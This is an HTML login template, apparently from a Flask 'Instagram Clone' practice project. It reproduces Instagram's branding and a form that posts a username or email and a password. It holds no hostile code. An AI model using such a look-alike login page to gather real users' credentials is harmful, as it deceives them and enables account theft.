<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Clone</title>
    
    <!-- Correct way to load CSS -->
    <link rel="stylesheet" href="{{ url_for('static', filename='css/styles.css') }}" />

    <!-- Correct way to load favicon -->
    <link rel="icon" type="image/png" href="{{ url_for('static', filename='img/insta-fav.ico') }}">
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="{{ url_for('static', filename='img/instagram-logo.png') }}" alt="Instagram logo" />
                </h1>

                <form method="POST">
                    <label for="email" class="sr-only">Phone, username, or email</label>
                    <input name="email" placeholder="Phone, username, or email" required />

                    <label for="password" class="sr-only">Password</label>
                    <input name="password" type="password" placeholder="Password" required />

                    <button type="submit">Log In</button>
                </form>

                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                
                <div class="login-with-fb flex direction-column align-items-center">
                    <a href="#">Log in with Facebook</a>
                    <a href="#">Forgot password?</a>
                </div>
            </div>

            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="#">Sign up</a>
            </div>

            <div class="app-download flex direction-column align-items-center">
                <p>Get the app.</p>
                <div class="flex justify-content-center">
                    <img src="{{ url_for('static', filename='img/apple-button.png') }}" alt="Apple Store logo" />
                    <img src="{{ url_for('static', filename='img/googleplay-button.png') }}" alt="Google Play logo" />
                </div>
            </div>
        </section>
    </main>
</body>
</html>
